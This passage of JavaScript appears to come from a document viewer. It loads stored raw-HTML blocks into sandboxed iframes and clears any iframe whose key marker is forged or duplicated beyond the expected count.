// as many frames as there were blocks that produced it, in document order; any
// extra frame claiming the same key is treated as forged and left empty.
function applyRawHtmlDocuments() {
  if (typeof viewer === 'undefined' || !viewer) return;
  const budget = new Map();
  rawHtmlDocuments.forEach((entry, key) => budget.set(key, entry.count));
  viewer.querySelectorAll('iframe.raw-html-block').forEach((frame) => {
    const key = frame.dataset.rawhtmlKey;
    const entry = rawHtmlDocuments.get(key);
    const left = budget.get(key) || 0;
    if (!entry || left <= 0) {
      // Forged marker, a duplicate claim, or a node left behind by an earlier
      // document. Removing srcdoc unloads whatever it was showing.
      frame.removeAttribute('srcdoc');
      return;
    }
    budget.set(key, left - 1);
    frame.setAttribute('sandbox', 'allow-scripts');
    if (frame.getAttribute('srcdoc') !== entry.doc) {
      frame.setAttribute('srcdoc', entry.doc);
    }
  });
}

